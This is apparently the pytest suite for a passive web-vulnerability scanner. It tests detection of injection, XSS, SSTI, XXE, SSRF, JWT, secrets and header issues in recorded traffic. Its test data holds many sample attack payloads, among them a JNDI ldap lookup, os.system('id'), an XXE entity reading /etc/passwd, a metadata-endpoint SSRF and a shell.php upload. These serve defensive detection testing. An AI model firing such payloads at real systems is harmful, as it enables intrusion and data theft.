"""
test_passive_scan.py — pytest coverage for every check and the cross-cutting
behaviours (base64/hex decoding, Burp import, secret redaction, JSON/HTML report
round-trip).

Run:  pytest -q
      pytest -q -k xss          # one check
      pytest -q tests/test_passive_scan.py::test_checks_positive

The `make_db` and `run_check` fixtures come from conftest.py.

Each check has at least one POSITIVE case (a crafted row that must produce a
finding for that check) and a NEGATIVE case (a benign row that must not). Cases
are declared as data so the matrix is easy to read and extend.
"""

import pathlib
import sqlite3

import pytest

import cru.checks
from cru import field_decode
from cru import passive_scan as ps
from cru.checks import CHECKS


def checks_of(findings):
    return {f.check for f in findings}


def sigs_of(findings):
    return {f.signature for f in findings}


# --------------------------------------------------------------------------- #
# Positive matrix: (check, row) -> must yield >=1 finding whose .check == check,
# and (optionally) a signature substring that must appear.
# --------------------------------------------------------------------------- #

import base64 as _b64
import pickle as _pickle


def b64(s):
    return _b64.b64encode(s.encode()).decode()


POSITIVE = {
    "deser": [
        (
            dict(
                method="POST",
                body="state=" + _b64.b64encode(b"\xac\xed\x00\x05sr\x00").decode(),
            ),
            None,
        ),  # java serialized magic (base64 of real bytes)
        (
            dict(method="POST", body='data=O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}'),
            "php-serialized-object",
        ),
        (
            dict(
                method="POST",
                body="state="
                + _b64.b64encode(_pickle.dumps({"a": 1}, protocol=4)).decode(),
            ),
            "python-pickle",
        ),
    ],
    "secrets": [
        (dict(response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}'), "aws-access-key-id"),
        (dict(headers="Authorization: Bearer ghp_" + "A" * 36), "github-pat"),
    ],
    "sqli": [
        (
            dict(
                response_status_code=500,
                response_body="You have an error in your SQL syntax; check the "
                "manual that corresponds to your MySQL server version",
            ),
            "sql-error-in-response",
        ),
        (dict(query="q=x' UNION SELECT a,b FROM users--"), "sqli-payload"),
        # parameter names that advertise a query-composition sink
        (dict(query="sqlQuery=SELECT+1"), "sqli-param:raw-sql-name (sink)"),
        (dict(method="POST", body='{"sql_query":"select 1"}'), "(sink)"),
        (dict(query="orderBy=name"), "sqli-param:clause-name (clause)"),
    ],
    "ssti": [
        (dict(query="q={{config.items()}}"), "template-syntax"),
        (dict(query="q=${{<%[%'\"}}%"), "template-syntax: SSTI polyglot"),
    ],
    "code": [
        (dict(method="POST", body="x=__import__('os').system('id')"), "code:python"),
        (dict(headers="User-Agent: ${jndi:ldap://x/a}"), "code:jndi-lookup"),
    ],
    "srcleak": [
        (dict(path="/i.php", response_body="<?php echo 1; ?>"), "php-source"),
        (dict(path="/.env", response_body="DB_PASSWORD=hunter2\nAPP_KEY=x"), "dotenv"),
    ],
    "xss": [
        (
            dict(
                query="q=<script>alert(1)</script>",
                response_body="echo <script>alert(1)</script>",
            ),
            "reflected",
        ),
        (dict(query="u=<img src=x onerror=alert(1)>"), "xss-payload"),
    ],
    "xxe": [
        (
            dict(
                method="POST",
                body='<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>',
            ),
            "xxe:external-entity",
        ),
        (dict(response_body="root:x:0:0:root:/root:/bin/bash"), "xxe:file-disclosure"),
    ],
    "ssrf": [
        (
            dict(query="url=http://169.254.169.254/latest/meta-data/"),
            "ssrf:cloud-metadata",
        ),
        (dict(query="image=http://127.0.0.1:9000/x"), "ssrf:internal-host"),
    ],
    "redirect": [
        (
            dict(
                query="next=https://evil.example/x",
                response_status_code=302,
                response_headers="Location: https://evil.example/x",
            ),
            "open-redirect-reflected",
        ),
        (dict(query="redirect=//evil.example"), "open-redirect-candidate"),
    ],
    "traversal": [
        (dict(query="file=../../../../etc/passwd"), "path-traversal"),
    ],
    "crlf": [
        (dict(query="x=en%0d%0aSet-Cookie:%20evil=1"), "crlf"),
    ],
    "nosqli": [
        (
            dict(
                method="POST",
                headers="Content-Type: application/json",
                body='{"u":{"$ne":null}}',
            ),
            "nosql-operator",
        ),
        (dict(query="age[$gt]=0"), "nosql-param-operator"),
    ],
    "upload": [
        (
            dict(
                method="POST",
                headers="Content-Type: multipart/form-data; boundary=x",
                body='Content-Disposition: form-data; name="f"; '
                'filename="shell.php"\r\n',
            ),
            "executable-extension",
        ),
    ],
    "headers": [
        (
            dict(
                response_headers="Content-Type: text/html",
                response_body="<html></html>",
            ),
            "missing-csp",
        ),
    ],
    "cors": [
        (
            dict(
                response_headers="Access-Control-Allow-Origin: *\n"
                "Access-Control-Allow-Credentials: true"
            ),
            "cors:wildcard-with-credentials",
        ),
        (
            dict(response_headers="Access-Control-Allow-Origin: null"),
            "cors:null-origin",
        ),
    ],
    "cookies": [
        (
            dict(response_headers="Set-Cookie: sessionid=abc; path=/"),
            "cookie-no-httponly",
        ),
    ],
    "jwt": [
        (
            dict(
                headers="Authorization: Bearer "
                + _b64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}')
                .rstrip(b"=")
                .decode()
                + "."
                + _b64.urlsafe_b64encode(b'{"user":"admin","sub":1}')
                .rstrip(b"=")
                .decode()
                + ".AAAAAAAAAAAA"
            ),
            "jwt:alg-none",
        ),
    ],
    "infoleak": [
        (
            dict(response_body="Traceback (most recent call last):\n  File x"),
            "python-traceback",
        ),
        (dict(response_body="<title>Index of /files</title>"), "dir-listing"),
    ],
    "fingerprint": [
        (dict(response_headers="Server: nginx/1.18.0"), "banner:server"),
    ],
    "methods": [
        (dict(method="DELETE", response_status_code=200), "method:DELETE"),
        (dict(method="TRACE", response_status_code=200), "method:TRACE"),
    ],
    "mixedcontent": [
        (
            dict(
                is_tls=1,
                response_headers="Content-Type: text/html",
                response_body='<script src="http://cdn/x.js"></script>',
            ),
            "mixed-content",
        ),
    ],
    "cleartext": [
        (
            dict(is_tls=0, method="POST", body="username=a&password=secret"),
            "cleartext-transmission",
        ),
    ],
    "csrf": [
        (
            dict(
                method="POST",
                cookies="session=abc",
                headers="Cookie: session=abc",
                body="email=x@y.com",
            ),
            "missing-csrf-token",
        ),
    ],
}


# Benign rows that must NOT trigger the given check.
NEGATIVE = {
    # The avatar URL is deliberate: its base64-ish segment decodes to bytes that
    # happen to contain \x80\x04, which used to read as a pickle PROTO opcode.
    "deser": dict(
        method="POST",
        body="name=John&city=Wellington",
        response_body='{"picture":"https://lh3.googleusercontent.com/a/'
        'ACg8ocI-B8h3xWwEP-gAT8dQeH_UpcjzdyOIPIO1-WwJARJaAbtIgQ=s96-c"}',
    ),
    # The ObjectId is deliberate: 24-hex resource IDs are enumeration
    # candidates for idor_finder, not secrets, so entropy must ignore them.
    "secrets": dict(
        response_body='{"ok":true,"count":3,"_id":"6a951f7f1af62e63c9e34025"}'
    ),
    "sqli": dict(query="q=coffee&sort=name&id=7", response_body="Results for coffee"),
    "ssti": dict(query="q=hello world"),
    "code": dict(query="note=please review the system before importing data"),
    "srcleak": dict(path="/app.js", response_body="function f(){console.log('hi')}"),
    "xss": dict(query="q=coffee", response_body="Results for coffee"),
    "xxe": dict(method="POST", body="<note><to>x</to></note>"),
    "ssrf": dict(query="id=42&sort=name"),
    "redirect": dict(query="page=2"),
    "traversal": dict(query="file=report.pdf"),
    "crlf": dict(query="q=hello"),
    "nosqli": dict(method="POST", body='{"user":"admin","age":30}'),
    "upload": dict(method="POST", body='filename="photo.jpg"'),
    "headers": dict(
        is_tls=1,
        response_headers="Content-Type: text/html\n"
        "Content-Security-Policy: default-src 'self'\n"
        "Strict-Transport-Security: max-age=1\n"
        "X-Frame-Options: DENY\nX-Content-Type-Options: nosniff\n"
        "Referrer-Policy: no-referrer\n"
        "Permissions-Policy: geolocation=()",
        response_body="<html>ok</html>",
    ),
    "cors": dict(response_headers="Content-Type: application/json"),
    "cookies": dict(
        response_headers="Set-Cookie: sid=x; Secure; HttpOnly; " "SameSite=Strict"
    ),
    "jwt": dict(response_body='{"ok":true}'),
    "infoleak": dict(response_body="<html><body>Welcome</body></html>"),
    "fingerprint": dict(response_headers="Content-Type: text/html"),
    "methods": dict(method="GET"),
    "mixedcontent": dict(
        is_tls=1,
        response_headers="Content-Type: text/html",
        response_body='<script src="https://cdn/x.js"></script>',
    ),
    "cleartext": dict(is_tls=1, method="POST", body="username=a&password=secret"),
    "csrf": dict(
        method="POST",
        cookies="session=abc",
        headers="Cookie: session=abc",
        body="email=x@y.com&csrf_token=deadbeef",
    ),
}


ALL_CHECKS = sorted(c.name for c in ps.build_checks("all"))


def test_every_check_module_is_registered():
    """A module in cru/checks/ that nobody registered is a check that never runs.

    `build_checks` and the --check choices both read the registry, so an
    unregistered module fails silently everywhere else, this test included.
    """
    package = pathlib.Path(cru.checks.__file__).parent
    modules = {p.stem for p in package.glob("*.py")} - {"__init__", "base"}
    assert modules == set(CHECKS)
    for key, cls in CHECKS.items():
        assert cls.name == key, f"{cls.__name__}.name is not its registry key"


def test_every_check_has_cases():
    """Guard: the matrix must cover every registered check."""
    missing_pos = [c for c in ALL_CHECKS if c not in POSITIVE]
    missing_neg = [c for c in ALL_CHECKS if c not in NEGATIVE]
    assert not missing_pos, f"no positive cases for: {missing_pos}"
    assert not missing_neg, f"no negative cases for: {missing_neg}"


@pytest.mark.parametrize("check", ALL_CHECKS)
def test_checks_positive(check, run_check):
    """Each positive case yields at least one finding for its own check."""
    for row, sig_substr in POSITIVE[check]:
        findings = run_check(check, [row])
        assert check in checks_of(
            findings
        ), f"{check}: expected a finding for row={row}"
        if sig_substr:
            assert any(sig_substr in f.signature for f in findings), (
                f"{check}: expected signature containing '{sig_substr}', "
                f"got {sigs_of(findings)}"
            )


@pytest.mark.parametrize("check", ALL_CHECKS)
def test_checks_negative(check, run_check):
    """Benign rows produce no finding for the check under test."""
    findings = run_check(check, [NEGATIVE[check]])
    assert check not in checks_of(
        findings
    ), f"{check}: false positive on benign row -> {sigs_of(findings)}"


# --------------------------------------------------------------------------- #
# Encoding: base64/hex-wrapped payloads must be caught via decoded columns.
# --------------------------------------------------------------------------- #

ENCODED = [
    ("code", dict(method="POST", body="d=" + b64("<?php system(1); ?>")), "code"),
    ("code", dict(query="p=" + b"__import__('os').system('id')".hex()), "code"),
    ("traversal", dict(query="f=" + b64("../../../../etc/passwd")), "traversal"),
    ("ssti", dict(query="t=" + b64("{{config.items()}}")), "ssti"),
    ("xss", dict(query="u=" + b64("<script>alert(1)</script>")), "xss"),
]


@pytest.mark.parametrize("check,row,expect", ENCODED)
def test_encoded_payloads_detected(check, row, expect, run_check):
    findings = run_check(check, [row])
    assert expect in checks_of(
        findings
    ), f"encoded payload not detected via decoded column: {row}"
    assert any(
        "#decoded" in f.location for f in findings
    ), "expected the finding to come from a #decoded view"


def test_encoding_requires_decoded_columns(run_check):
    """Without decoded columns (legacy DB), the encoded payload is not seen."""
    row = dict(method="POST", body="d=" + b64("<?php system(1); ?>"))
    findings = run_check("code", [row], decoded=False)
    assert not any("#decoded" in f.location for f in findings)


def test_decoded_view_helper():
    assert "system" in field_decode.decoded_view("x=" + b64("system('id')"))
    assert "/etc/passwd" in field_decode.decoded_view(
        "".join(f"%{b:02x}" for b in b"/etc/passwd")
    )
    assert field_decode.decoded_view("just plain text") == ""
    assert field_decode.decoded_view(None) == ""


# --------------------------------------------------------------------------- #
# Cross-cutting: dedup, redaction, runner
# --------------------------------------------------------------------------- #


def test_dedup_collapses_identical_findings(run_check):
    row = dict(response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}')
    findings = run_check("secrets", [row, dict(row)])
    aws = [f for f in findings if f.signature == "aws-access-key-id"]
    assert len(aws) == 1, "identical findings across rows should dedupe"


def test_secret_redaction_default_and_reveal(run_check):
    row = dict(response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}')
    findings = run_check("secrets", [row])
    redacted = ps._present(list(findings), show_secrets=False)
    assert all(
        "AKIAIOSFODNN7EXAMPLE" not in f.evidence
        for f in redacted
        if f.check == "secrets"
    )
    # re-run for a clean copy, reveal
    findings2 = run_check("secrets", [row])
    shown = ps._present(list(findings2), show_secrets=True)
    assert any("AKIAIOSFODNN7EXAMPLE" in f.evidence for f in shown)


def test_all_runner_covers_registered_checks():
    checks = ps.build_checks("all")
    assert sorted(c.name for c in checks) == ALL_CHECKS
    assert len(ALL_CHECKS) == 24


@pytest.mark.parametrize(
    "param",
    ["sqlQuery", "sql_query", "sql-query", "SQLQuery", "rawSql", "execSQL"],
)
def test_sqli_flags_sql_parameter_name_permutations(param, run_check):
    """Any casing or separator around "sql" in a parameter name is a sink."""
    findings = run_check("sqli", [dict(query=f"{param}=SELECT+1")])
    assert any(
        "(sink)" in f.signature for f in findings
    ), f"{param} not flagged as a raw SQL sink -> {sigs_of(findings)}"


def test_sqli_param_name_alone_does_not_flag_ordinary_params(run_check):
    """Names that merely look query-ish must not fire; only clause names do."""
    findings = run_check(
        "sqli", [dict(query="query=coffee&filter=new&search=x&columns=id,name")]
    )
    assert not any("sqli-param" in f.signature for f in findings), sigs_of(findings)


def test_sqli_payload_escalation_is_high_note(run_check):
    """Payload + 5xx should carry the 'likely injectable' correlation note."""
    row = dict(
        query="q=1'--",
        response_status_code=500,
        response_body="ORA-00933: SQL command not properly ended",
    )
    findings = run_check("sqli", [row])
    assert any("error-in-response" in f.signature for f in findings)


# --------------------------------------------------------------------------- #
# Importer + report round-trip (import into schema, scan, render)
# --------------------------------------------------------------------------- #


def _burp_xml(items):
    import base64

    parts = ['<?xml version="1.0"?>', "<items>"]
    for method, path, req_body, resp in items:
        target = path
        raw = f"{method} {target} HTTP/1.1\r\nHost: app.test\r\n"
        if req_body:
            raw += (
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(req_body)}\r\n\r\n{req_body}"
            )
        else:
            raw += "\r\n"
        parts += [
            "<item>",
            f"<url><![CDATA[https://app.test{path}]]></url>",
            "<host>app.test</host><port>443</port><protocol>https</protocol>",
            f"<method><![CDATA[{method}]]></method>",
            f"<path><![CDATA[{path}]]></path>",
            (
                f'<request base64="true"><![CDATA['
                f"{base64.b64encode(raw.encode()).decode()}]]></request>"
            ),
            "<status>200</status><responselength>2</responselength>",
            (
                f'<response base64="true"><![CDATA['
                f"{base64.b64encode(resp.encode()).decode()}]]></response>"
            ),
            "</item>",
        ]
    parts.append("</items>")
    return "\n".join(parts)


def test_burp_import_populates_decoded_columns(tmp_path):
    from cru import burp_to_sql

    xml = tmp_path / "h.xml"
    xml.write_text(
        _burp_xml(
            [
                (
                    "POST",
                    "/a",
                    "d=" + b64("<?php system(1); ?>"),
                    "HTTP/1.1 200 OK\r\n\r\nok",
                ),
            ]
        )
    )
    db = tmp_path / "b.db"
    total, _skipped = burp_to_sql.import_burp(str(xml), str(db))
    assert total == 1
    con = sqlite3.connect(str(db))
    cols = {r[1] for r in con.execute("PRAGMA table_info(requests)")}
    assert {"query_decoded", "body_decoded", "response_body_decoded"} <= cols
    bd = con.execute("SELECT body_decoded FROM requests").fetchone()[0]
    assert "system" in bd  # decoded at import time


def test_burp_import_then_scan_finds_encoded(tmp_path):
    from cru import burp_to_sql

    xml = tmp_path / "h.xml"
    xml.write_text(
        _burp_xml(
            [
                (
                    "POST",
                    "/a",
                    "d=" + b64("<?php system(1); ?>"),
                    "HTTP/1.1 200 OK\r\n\r\nok",
                ),
            ]
        )
    )
    db = tmp_path / "b.db"
    burp_to_sql.import_burp(str(xml), str(db))
    rows = ps.load_rows(str(db))
    findings = []
    for c in ps.build_checks("code"):
        findings.extend(c.run(rows))
    assert any("#decoded" in f.location for f in findings)


def test_report_json_html_roundtrip(tmp_path, make_db):
    from cru import report_html

    # minimal DB with one clear finding
    db = tmp_path / "r.db"
    con = make_db([dict(response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}')])
    # persist the in-memory DB to disk for the report tool
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    rows, findings, messages = report_html.collect(
        str(db), "requests", "secrets", False
    )
    doc = report_html.build_report_doc(rows, findings, {"db": str(db)}, messages)
    assert doc["meta"]["total_findings"] == len(findings) >= 1
    html = report_html.render_html(doc)
    # payload must be escaped in the embedded JSON (no raw </script>, and the
    # secret is redacted by default — in the message text too, not just the
    # finding, or the report would leak what the finding hides)
    assert "AKIAIOSFODNN7EXAMPLE" not in html
    assert '<script id="r-data"' in html
    # re-render from the doc alone reproduces the same HTML
    assert report_html.render_html(doc) == html


def test_report_points_at_the_message_the_evidence_came_from(tmp_path, make_db):
    """The dropdown shows the request/response, with the evidence located in it.

    Masking a secret in the message has to preserve length, or every offset
    after it — including this finding's own — would point at the wrong text.
    """
    from cru import report_html

    secret = "AKIAIOSFODNN7EXAMPLE"
    db = tmp_path / "m.db"
    con = make_db(
        [dict(path="/a", query="q=1", body=f'{{"key":"{secret}","tail":"zzz"}}')]
    )
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    rows, findings, messages = report_html.collect(
        str(db), "requests", "secrets", False
    )
    doc = report_html.build_report_doc(rows, findings, {"db": str(db)}, messages)
    rec = next(f for f in doc["findings"] if f["signature"] == "aws-access-key-id")

    pane = doc["messages"][str(rec["row"])][rec["pane"]]
    assert pane.startswith("GET /a?q=1 HTTP/1.1")
    assert secret not in pane, "the message must not leak what the finding hides"
    # The offsets still land on the (masked) secret, and nothing after it moved.
    assert pane[rec["match"][0] : rec["match"][1]] == report_html._mask(secret)
    assert '"tail":"zzz"' in pane[rec["match"][1] :]


def test_report_message_offsets_survive_astral_characters(tmp_path, make_db):
    """Offsets are UTF-16 units because that is what JS string slicing counts."""
    from cru import report_html

    db = tmp_path / "u.db"
    con = make_db([dict(response_body='{"note":"\U0001f600","k":"sk-live-x"}')])
    disk = sqlite3.connect(str(db))
    con.backup(disk)
    disk.close()

    rows, findings, messages = report_html.collect(str(db), "requests", "secrets", True)
    doc = report_html.build_report_doc(rows, findings, {"db": str(db)}, messages)
    for rec in doc["findings"]:
        if not rec["match"]:
            continue
        pane = doc["messages"][str(rec["row"])][rec["pane"]]
        units = pane.encode("utf-16-le")
        sliced = units[rec["match"][0] * 2 : rec["match"][1] * 2].decode("utf-16-le")
        assert sliced == report_html._needle(rec["evidence"])


def test_legacy_db_without_decoded_columns_still_scans():
    """Loader falls back gracefully when decoded columns are absent."""
    con = sqlite3.connect(":memory:")
    con.execute(
        "CREATE TABLE requests (host TEXT, method TEXT, path TEXT, "
        "query TEXT, cookies TEXT, headers TEXT, body TEXT, "
        "is_tls BOOLEAN, response_status_code INTEGER, "
        "response_headers TEXT, response_body TEXT)"
    )
    con.execute(
        "INSERT INTO requests (host,method,path,query,is_tls,"
        "response_status_code) VALUES "
        "('app.test','GET','/','q=<script>alert(1)</script>',1,200)"
    )
    con.commit()
    con.row_factory = sqlite3.Row
    rows = con.execute("SELECT * FROM requests").fetchall()
    findings = ps.build_checks("xss")[0].run(rows)
    assert "xss" in {f.check for f in findings}


def _jwt(claims, header=None):
    """Build a JWT-shaped token; the signature only has to look like one."""
    import base64
    import json as _json

    def seg(obj):
        raw = _json.dumps(obj, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).decode().rstrip("=")

    head = seg(header or {"alg": "HS256", "typ": "JWT"})
    return f"{head}.{seg(claims)}.aaaaaaaabbbbbbbbcccccccc"


def test_jwt_findings_dedupe_on_decoded_content(run_check):
    """A re-issued token is one finding carrying every path it was seen on.

    Refreshing a session mints a new iat/exp and a new signature for the same
    credential, which used to leave one finding per request.
    """
    same_a = _jwt({"sub": "42", "role": "admin", "iat": 1, "exp": 2})
    same_b = _jwt({"sub": "42", "role": "admin", "iat": 900, "exp": 999})
    other = _jwt({"sub": "43", "role": "admin", "iat": 1, "exp": 2})
    rows = [
        dict(path="/a", headers=f"Authorization: Bearer {same_a}"),
        dict(path="/b", headers=f"Authorization: Bearer {same_b}"),
        dict(path="/c", headers=f"Authorization: Bearer {other}"),
    ]

    findings = run_check("jwt", rows)
    hmac = [f for f in findings if f.signature == "jwt:hmac-alg"]
    assert len(hmac) == 2, "one finding per distinct token, not per re-issue"
    merged = next(f for f in hmac if len(f.paths) > 1)
    assert merged.paths == ["/a", "/b"]
    assert next(f for f in hmac if len(f.paths) == 1).paths == ["/c"]


def test_secrets_jwt_detector_dedupes_the_same_way(run_check):
    """The `jwt` detector in the secrets check groups on content too."""
    same_a = _jwt({"sub": "42", "iat": 1, "exp": 2})
    same_b = _jwt({"sub": "42", "iat": 900, "exp": 999})
    rows = [
        dict(path="/a", body=same_a),
        dict(path="/b", body=same_b),
    ]

    tokens = [f for f in run_check("secrets", rows) if f.signature == "jwt"]
    assert len(tokens) == 1
    assert tokens[0].paths == ["/a", "/b"]


def test_ungrouped_findings_still_dedupe_per_path(run_check):
    """Only grouped findings merge: everything else keeps path-level dedup."""
    rows = [
        dict(path="/a", response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}'),
        dict(path="/b", response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}'),
    ]

    keys = [f for f in run_check("secrets", rows) if f.signature == "aws-access-key-id"]
    assert len(keys) == 2
    assert sorted(f.paths for f in keys) == [["/a"], ["/b"]]
